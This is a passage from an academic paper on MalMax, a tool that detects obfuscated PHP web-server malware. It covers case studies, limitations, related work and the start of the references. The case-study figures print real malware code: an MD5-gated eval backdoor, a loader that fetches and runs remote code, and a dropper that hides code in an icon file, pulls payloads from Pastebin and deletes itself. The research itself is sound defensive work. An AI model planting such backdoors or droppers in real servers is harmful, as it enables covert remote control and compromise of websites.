it as malware, indicating the obfuscation of the sample successfully
avoids detection. Note that the deobfuscated malware is detected
by only 2 AVs, suggesting the limitation of signature-based tools.
Figure 8: Obfuscated Evasive Malware Sample I.
on line 12 is not satisfied. To satisfy the condition, the predicate
conditions on lines 6 and 9 should be true and false respectively.
We find that requiring such complex conditions makes the analysis
particularly challenging. Fortunately, MalMax explores all possible
paths, discovering the malicious behaviors at 4 . Because of the
obfuscation and evasion tricks ( 2 and 4 ), the hidden malicious
behavior is not exposed in any other existing tools. Existing sandbox
tools that try to execute and observe malicious behaviors fail to
meet the conditions at 1 , 2 and 3 .
Exploit Scenario: From our analysis, we identified a typical exploit
scenario of the sample, illustrated in Fig. 9. First, an attacker may in-
ject the malicious PHP code shown in Fig. 8-(a) to the victim server
via various vulnerabilities ( 1 ). Note that the PHP code does not
contain malicious code in itself. Instead, it connects to a legitimate
website and fetches the data from there. After injecting the PHP
code to the victim server, the attacker visits the benign website and
creates a message that includes an encrypted malicious payload via
the website’s interface such as writing a comment on a post ( 2 ).
Later, the injected PHP code retrieves 3 , decodes and executes
the malicious payload 4 . Note that this sample avoids detection
of various network traffic analysis tools that look for suspicious
IP addresses and URLs delivering malicious payloads. As the sam-
ple gets the payload through a benign website and the payload is
encoded, network-level tools are less effective in detection.
Figure 9: Exploit Scenario of Malware Sample I.
The code has several evasive tricks. First, it calculates an MD5
value from an external input (e.g., $_POST) and only when it matches
with the hardcoded MD5 value does decode and execute remote
code provided by an attacker 1 . Moreover, Lines 5-15 show that it
checks several environment variables (e.g., $_REQUEST) to identify
the right victim 2 . If those checks are not satisfied, the program
quits without exhibiting malicious behaviors 2 . Later, the malware
also checks whether the client is running Windows, as well as other
server-side environment checks 3 , and only when the malware
finds the desired environment does it fetch remote code from a
website 3 , decode it, and then execute it 4 .
Note that 2 is particularly interesting. While 2 does not have
any malicious behavior, the program quits if the predicate condition
Sample II: Command & Control via Icon File. Fig. 10-(a) shows
the malware in its original form (i.e., obfuscated). Because it was
obfuscated, VT failed to detect this sample. We leverage MalMax
to deobfuscate the malware and the result is shown in Fig. 10-(b).
The deobfuscated code is flagged as malware by VT (1 AV engine),
indicating the applied obfuscation successfully avoided detection.
The malware has two steps. First, it decodes a malicious base64
encoded payload and writes it to a file named kk.ico. Note that
the decoding (and writing) to a file is common among applications
and is typically used to cache data. Later, the malware includes
that file, executing the deobfuscated code residing in the icon file.
On the deobfuscated version shown in Fig. 10-(b), on Lines 1-14 ( 1 ,
2 , 3 ) the malware downloads new code from 3 Pastebin entries.
Pastebin [51] is a public website for creating temporary texts for
sharing, and, in this case, attackers are using it as a Command &
Control server to send commands to this malware. Finally, on Line
16 ( 4 ), the malware deletes itself to avoid detection.
Note that all three instances of commands received are stored
in publicly available folders of the web application, prefixed by
$DOCUMENT_ROOT environment variable, using legitimate-looking
if(md5($_POST["..."]) === "...") {// Remote Code Injectioneval(base64_decode($_POST["..."]));}// Evasive Trick (5-14)if(strpos(...) !== false)$patchedfv= "GHKASMVG";...if(md5($_REQUEST['...']) === "...")$patchedfv= "SDFDFSDF";...if($patchedfv=== "GHKASMVG") {@ob_end_clean();die;}/*Check whether (1) the client is Windows and (2) a targeted victim by comparing cookies andserver sideenvironment variables*/$vkfu=file_get_contents("https://legitimate_url",false, $context_jhkb);if($vkfu) eval($vkfu);...1234567891011121314151617181920212223/*435345352*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('aWYobWQ1KCRfUE9TVFsicGYiXSkgPT09ICI5M2FkMDAzZDdmYzU3YWFlOTM4YmE0ODNhNjVkZGY2ZCIpIHsgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsiY29va2llc19wIl0pKTsgfQppZiAoc3RycG9z...yAiPHNjcmlwdD5kb2N1bWVudC5jb29raWU9J2NvbmR0aW9ucz0yOyBwYXRoPS87IGV4cGlyZXM9Ii5kYXRlKCdELCBkLU0tWSBIOmk6cycsdGltZSgpKzE3MjgwMCkuIiBHTVQ7Jzs8L3NjcmlwdD4iOyB9IDt9Owp9Cn0K’); ... $base=array(0x00 => 'dit', 'dix', 'di', 'dip', 'diex', 'die', 'diep', 'dat', 'dax', 'da', 'dap', 'duox', 'duo', 'dot', 'dox', 'do’,...);}1234(a)	Obfuscated	Malware(b)	DeobfuscatedMalware2134VictimWebsiteMaliciousPHP	filesBenign	Website	(allows	posting)1234InjectWriteanencryptedmessageDecrypt	and	executeConnections	to	the	website	are	not	suspicious	and	detected	by	existing	security	tools	(e.g.,	AVs,	Firewalls)!Figure 10: Obfuscated Evasive Malware Sample II.
file names such as themes/index.php, sites/example.local.
sites.php, and w.php.
Existing tools failed to recognize this malware because it does not
contain eval() to run the malicious payload, rather, it puts it in an
icon file and includes that file. Dynamic tools are also likely to fail
because the dynamically generated icon file only sends three HTTP
requests and writes three files, without running any malicious code.
Behavioral analysis is needed to recognize content is read from the
Internet and then wrote as PHP files on the web server. MalMax
recognizes such orchestration as malware by connecting those
individually not malicious but collectively malicious behaviors.
5 DISCUSSION AND LIMITATIONS
Evading PhpMalScan. In essence, the two thresholds used by
PhpMalScan to detect malware are complementary. One is used to
detect malware that performs pervasive malicious behavior, while
the other is used to detect surgical but short malicious behavior
injected in a benign file. Although it is technically possible for an
adversary who knows the internal thresholds (i.e., PMFR and MS)
to bypass them, it is still difficult to design a malware that is neither
pervasive nor exhibits enough malicious behavior.
Conditional-dependent malware uses encryption to obfuscate
its payload, and uses the exact combination of inputs required to
reach the malicious branch as the decryption key [62]. MalMax is
not able to handle such malware. However, they are rare in practice.
We observed one instance in our experiments (m36 in Dataset B).
State-Explosion. To avoid state-explosion, MalMax relies on con-
crete executions. Still, there is a concern of state-explosion because
MalMax shares global artifacts between isolated executions. How-
ever, each time an artifact is shared, MalMax creates a new exe-
cution with its own isolated state, effectively turning a potential
state-explosion problem into a path-explosion problem.
Path-Explosion. There are two sources of path-explosion. First,
loops that run for many iterations or indefinitely are the most sig-
nificant source of path-explosion. MalMax mitigates this problem
via control flow trimming (Details in Section 3.1). Second, a large
number of branches within the program can cause path-explosion.
Wordpress for example, has a total of 25,578 if branches and 1,254
switch branches, while Joomla has 22,679 and 2,157 respectively.
Also, this problem can be compounded by artifact sharing via co-
operative isolated executions, as each shared artifact creates an
additional isolated execution.
However, artifacts are shared on-demand, only when they are
not available (e.g., undefined) in the current isolation. Importantly,
in practice, because of incorrect execution contexts caused by the
sharing, additional isolated executions created by artifact sharing
often crash quickly. We observed that the number of paths does
not grow exponentially during our evaluation.
Infeasible Paths and Incorrect Program States. MalMax might
exercise infeasible paths because it enters every branch it encoun-
ters. Execution of infeasible paths can result in incorrect program
states, potentially leading to false positives and false negatives.
Moreover, artifacts shared from an infeasible path can create new
isolated executions with incorrect program states, compounding
the problem. Although new isolations with incorrect states created
as a result of infeasible paths may cause a false positive, because
they do not affect any isolation with correct state, they do not result
in a false negative. As for false positives, we manually verified all
false positive cases in Fig. 6, and none were due to infeasible paths
and incorrect states.
Sensitivity of Maliciousness Score. To understand the impor-
tance of maliciousness score and the consequences of changing the
scores, we performed a sensitivity analysis by setting the malicious-
ness score of all explicitly sandboxed functions to 1, regardless of
their input arguments. The sensitivity analysis shows that without
this fine-grained scoring, we miss an additional 176 detected mal-
ware samples (4.5% additional false negatives) as well as incorrectly
flag 73 benign files (1.8% additional false positives).
Newly Identified Malware Samples by MalMax. PhpMalScan
identified additional 1,485 malware samples in Dataset A that are
not detected by the 70 antivirus scanners in VirusTotal. While some
of these 1,485 malware samples may be previously unknown mal-
ware, definitive determination of whether any of them have never
previously been seen is beyond the scope of this work.
6 RELATED WORK
Malicious Payload/Behavior Discovery. A sizable group of re-
lated work focuses on discovering malicious payloads on servers
by investigating their client-side HTML and Javascript output [5, 9,
15, 29, 34, 56, 63]. However, they may not reveal the existence of
malware on a server reliably. Malware that can recognize detection
attempts do not emit full behavior to the client [15].
Starov et al. extend a vulnerability analysis engine for PHP pro-
gram [22] to discover and quantify features of a PHP webshell
dataset [65]. They mark functions of interest as potential sources of
vulnerability and rely on manual code auditing to verify extracted
features. Regarding webshells, our analysis results echo their find-
ings. However, while [65] focuses on webshells, MalMax deals
with diverse types of malware that are heavily obfuscated and in-
jected into complex benign applications. In fact, many of malware
found by MalMax are implanted into the benign applications, and
leverage Object-Oriented Programming (OOP) features and mul-
tiple functions to carry out the attacks. The webshells that Starov
et al. analyze were comparably simple (i.e., no OOP features and
inter-procedure malicious code, mentioned in [65]). Moreover, [65]
relies on unPHP [69] for deobfuscation of malware, which fails to
$text= http_get('https://pastebin.com/raw/...');$open= fopen(".../sites.php", 'w');fwrite($open, $text);fclose($open);$text3= http_get('https://pastebin.com/raw/...');$op3= fopen(".../w.php", 'w');fwrite($op3, $text3);fclose($op3);$text7= http_get('https://pastebin.com/raw/...');$op7 = fopen(".../themes/index.php", 'w');fwrite($op7, $text7);fclose($op7);@unlink(__FILE__); // delete itself12345678910111213141516$check= $_SERVER['DOCUMENT_ROOT']."/kk.ico";$fp= fopen("$check","w+");fwrite($fp,base64_decode('PD9waHANCmZ1bmN0aW9uIGh0dHBfZ2V0KCR1cmwpew0KCSRpbSA9IGN1cmxfaW5pdCgkdXJsKTsNCgljdXJsX...MRV9fKTsNCg0KDQo/Pg=='));fclose($fp);include$check;12345(a)	Step	1:	Create	an	Icon	containing	Malicious	Code(b)	Step	2:	Malware	Disguised	as	an	Icon2134There has been a line of research that focuses on discovering
malicious behavior in binaries, in contrast with dynamic scripted
code. Binaries are limited in their dynamic behavior and need to be
coupled with significant code that enables them to modify them-
selves, enabling polymorphic or metamorphic malware. Thus, many
of these works focus on finding the polymorphic behavior, which
is rare in binaries, rather than the actual malicious behavior, which
is hard to pinpoint due to the very wide range and functionality of
binary applications [7, 17, 47]. Several works focus on discovering
desktop malware such as ransomware, by sandboxing and observ-
ing their interactions with the operating system. They are related to
ours in the approach they take, but they focus on binaries [35, 61].
Graziano et al. [24] propose a machine learning-based approach
that predicts malicious behavior. Their work is complementary to
our approach and can be used to increase the accuracy of our work,
especially when detecting introspective malware that is aware of
its environment. There have also been many works on malware
clustering, i.e., finding similarities between malware and detect-
ing malware families [26]. Some tools focus on finding the decryp-
tion/deobfuscation code block and consider that malicious behavior,
regardless of the obfuscated activity [17, 18, 34]. Such tools result
in high false positive rates because many legitimate applications
obfuscate their code for digital rights and security reasons. Many
sizable applications such as Wordpress use libraries that use obfus-
cation for benign purposes. For example, the work by [19] uses a
PDF Javascript emulator to emulate one dynamic trace of poten-
tially malicious PDF files, and then mostly seeks decoding behavior
rather than explicitly malicious behavior.
In the realm of binary programs,
Counterfactual Execution.
Moser [47] uses counterfactual execution as a means to discover
hidden behavior. However, their work does not heavily rely on coun-
terfactual execution as binaries under investigation crash too fre-
quently. Instead, they focus on solving linear equations via solvers.
Limbo [73] features a forced sampled execution approach to
detect kernel rootkits. It traverses a driver’s control flow graph
(CFG), and ensures that basic blocks in the CFG are executed at
least once, but no more than N (predefined) times. It may miss
executions of frequently executed basic blocks (e.g., blocks in a
library function). MalMax does not limit the number of executions
of each basic block, except for the loops/recursive calls where we
dynamically adjust the threshold via control flow trimming.
Peng et al. advance counterfactual execution on binaries by pro-
viding better error recovery and path expansion algorithms [52].
Rozzle [37] and GoldenEye [78] provide a similar approach to
counterfactual execution, focusing on discovery of environment
targeted malware. In particular, Rozzle [37] explores multiple exe-
cution paths by executing both possibilities whenever it encounters
a branch that depends on the environment (e.g., for environment
matching or fingerprinting). However, malware that does not rely
on control flow branches can evade Rozzle [34].
deobfuscate about 40% of their samples [65]. During our evaluation,
MalMax handles samples that unPHP failed to deobfuscate.
For example, a typical server-side malware injected into a plugin
of a benign application (e.g., Joomla) will be activated by a statement
load_plugin($config[‘plugins’][...]) where $config is
a global variable that determines what plugin should be loaded.
The malware may or may not be executed depending on $config.
As there are no branches involved, Rozzle would fail to detect this
malware, and no weak updates are performed (they are only per-
formed under branches). Cooperative isolated execution handles
this case by sharing the global variable $config between isolated
executions (Details in Section 3.2). In addition, PHP malware are of-
ten injected into complex benign programs, which cause scalability
issues for approaches that use symbolic execution [37, 79].
J-Force [36] also uses a similar method to analyze JavaScript (JS)
malware which frequently leverages user events such as mouse
clicks to hide malicious behaviors. In contrast, MalMax focuses
on handling server-side specific evasive techniques such as heavy
obfuscations and plugins architectures (Section 2). NAVEX uses a
similar approach to counterfactual execution to discover vulnera-
bilities in web applications [2]. However, NAVEX is rooted in static
analysis, resulting in evasion by many metamorphic malware. The
most closely related research to our work uses runkit [68], a PHP
extension that allows overriding functions and operators, to create
a sandbox in PHP, and evaluates one dynamic path of an appli-
cation while checking for the presence of potentially malicious
functions [76]. Finally, we note that static PHP analyzers such as
Pixy and RIPS [22, 32] are unable to fully uncloak dynamic malware
as they do not employ counterfactual execution.
Network Traffic based Analysis. Another group of research
tries to detect malware from network traffic and other external
behavior, via honeypots, IDS and firewalls [3, 11]. We do not in-
spect network traffic. Chang et al. summarize different methods
for defending against web malware into three categories, finding
malicious servers via client-side HTML, finding malicious servers
by discovering vulnerable web applications, and protecting clients
from malicious servers [13]. The second category enables discov-
ery of servers that are susceptible to infection, but none of the
categories discover malware on a server.
7 CONCLUSION
In this paper, we highlight the challenges associated with detect-
ing dynamic web server malware. We present MalMax, a system
capable of systematically exploring dynamic program behavior
using a combination of counterfactual execution and cooperative
isolated execution. Our evaluation on a set of real-world malware
samples demonstrates that MalMax is highly effective in accurately
detecting sophisticated malware where other state-of-the-art tools
have low detection rates and high false positive rates for our mal-
ware dataset (Dataset B). Moreover, our large scale evaluation shows
that MalMax can accurately identify in-the-wild polymorphic and
metamorphic malware. We exclusively identify 1,485 malware sam-
ples that are not detected by any existing state-of-the-art tools
despite their being in the wild for over 7 months.
ACKNOWLEDGMENTS
We thank the anonymous referees and our shepherd Alexandros
Kapravelos for their constructive feedback on this paper. We also
thank CodeGuard for sharing data for this research. The authors
gratefully acknowledge the support of AFRL (FA8750-17-S-7007)
and NSF (1916499 and 1850392). The views and opinions and/or
findings expressed are those of the authors and should not be inter-
preted as representing the official views or policies of the Depart-
ment of Defense or the U.S. Government.
REFERENCES
[1] A free online service for analysis of files and URLs enabling the identification of
malicious content. 2016. VirusTotal. https://www.virustotal.com. (2016).
[2] Abeer Alhuzali, Rigel Gjomemo, Birhanu Eshete, and V N Venkatakrishnan. 2018.
NAVEX - Precise and Scalable Exploit Generation for Dynamic Web Applications.
USENIX Security Symposium (2018).
[3] Blake Anderson and David McGrew. 2016. Identifying Encrypted Malware Traffic
with Contextual Flow Data. In Proceedings of the 2016 ACM Workshop on Artificial
Intelligence and Security (AISec ’16). ACM, New York, NY, USA, 35–46.
[4] Anonymous. 2019. Anonymized-for-review. Anonymous URL. (2019).
[5] Michael Bailey, Jon Oberheide, Jon Andersen, Zhuoqing Morley Mao, Farnam
Jahanian, and Jose Nazario. 2007. Automated Classification and Analysis of
Internet Malware. RAID (2007).
(2019).
[6] Bartblaze. 2019. PHP Backdoors. https://github.com/bartblaze/PHP-backdoors.
[7] Ulrich Bayer, Imam Habibi, Davide Balzarotti, and Engin Kirda. 2009. A View on
Current Malware Behaviors. LEET (2009).
[8] Tim Blazytko, Moritz Contag, Cornelius Aschermann, and Thorsten Holz. 2017.
Syntia: Synthesizing the semantics of obfuscated code. In USENIX Security Sym-
posium. Usenix.
[9] Kevin Borgolte, Christopher Kruegel, and Giovanni Vigna. 2013. Delta - automatic
identification of unknown web-based infection campaigns. ACM Conference on
Computer and Communications Security (2013).
[10] BuiltWith. 2016. CMS Usage Statistics. http://trends.builtwith.com/cms. (2016).
[11] Davide Canali and Davide Balzarotti. 2013. Behind the Scenes of Online Attacks
- an Analysis of Exploitation Behaviors on the Web. NDSS (2013).
[12] Davide Canali, Andrea Lanzi, Davide Balzarotti, Christopher Kruegel, Mihai
Christodorescu, and Engin Kirda. 2012. A Quantitative Study of Accuracy in
System Call-based Malware Detection. In Proceedings of the 2012 International
Symposium on Software Testing and Analysis (ISSTA 2012). ACM, New York, NY,
USA, 122–132.
[13] Jian Chang, Krishna K. Venkatasubramanian, Andrew G. West, and Insup Lee.
2013. Analyzing and Defending Against Web-based Malware. ACM Comput. Surv.
45, 4, Article 49 (Aug. 2013), 35 pages. https://doi.org/10.1145/2501654.2501663
[14] Vitaly Chipounov, Volodymyr Kuznetsov, and George Candea. 2011. S2E: A
platform for in-vivo multi-path analysis of software systems. In ACM SIGARCH
Computer Architecture News, Vol. 39. ACM, 265–278.
[15] Nicolas Christin. 2012. Traveling the Silk Road: A measurement analysis of a
large anonymous online marketplace. arXiv.org (July 2012). arXiv:1207.7139v2
[16] Mihai Christodorescu and Somesh Jha. 2004. Testing malware detectors. ISSTA
(2004), 34.
[17] M Christodorescu, S Jha, S A Seshia, D Song, and R E Bryant. 2005. Semantics-
Aware Malware Detection. In 2005 IEEE Symposium on Security and Privacy